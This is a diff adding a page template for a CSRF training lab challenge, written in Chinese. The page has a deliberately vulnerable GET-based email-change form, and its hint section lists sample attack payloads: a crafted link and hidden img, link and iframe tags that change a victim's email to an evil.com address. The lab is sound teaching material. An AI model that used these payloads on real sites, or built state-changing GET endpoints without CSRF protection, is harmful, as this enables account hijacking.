@@ -1,0 +1,39 @@
+<%- include('../layout', { body: `
+<div class="challenge">
+  <div class="challenge-description">
+    <h3>CSRF - Level 3 (GET型)</h3>
+    <p>这个页面存在GET型CSRF漏洞。尝试创建一个恶意链接或页面，在用户不知情的情况下修改其邮箱地址。</p>
+    <p>提示：通过构造一个GET请求链接，可以实现CSRF攻击。</p>
+  </div>
+  
+  <div class="challenge-info">
+    <h4>当前用户信息</h4>
+    <p><strong>用户名：</strong> ${user.username}</p>
+    <p><strong>邮箱：</strong> ${user.email}</p>
+  </div>
+  
+  <div class="challenge-form">
+    <h4>修改邮箱</h4>
+    <form method="GET" action="/csrf/level3/change-email">
+      <div class="form-group">
+        <label for="email">新邮箱地址：</label>
+        <input type="email" id="email" name="email" value="${user.email}" required>
+      </div>
+      <button type="submit" class="btn">更新邮箱</button>
+      <a href="/source/csrf/3" class="btn">查看源码</a>
+    </form>
+  </div>
+  
+  <div class="challenge-hint">
+    <h4>GET型CSRF攻击示例</h4>
+    <p>以下是一个恶意链接的示例：</p>
+    <pre><code>http://localhost:5000/csrf/level3/change-email?email=hacked%40evil.com</code></pre>
+    <p>攻击者可以通过以下多种方式诱导用户点击：</p>
+    <ul>
+      <li>通过图片标签：<code>&lt;img src="http://localhost:5000/csrf/level3/change-email?email=hacked%40evil.com" style="display:none"&gt;</code></li>
+      <li>通过外部资源引用：<code>&lt;link rel="stylesheet" href="http://localhost:5000/csrf/level3/change-email?email=hacked%40evil.com"&gt;</code></li>
+      <li>通过IFrame：<code>&lt;iframe src="http://localhost:5000/csrf/level3/change-email?email=hacked%40evil.com" style="display:none"&gt;&lt;/iframe&gt;</code></li>
+    </ul>
+  </div>
+</div>
+` }) %> 
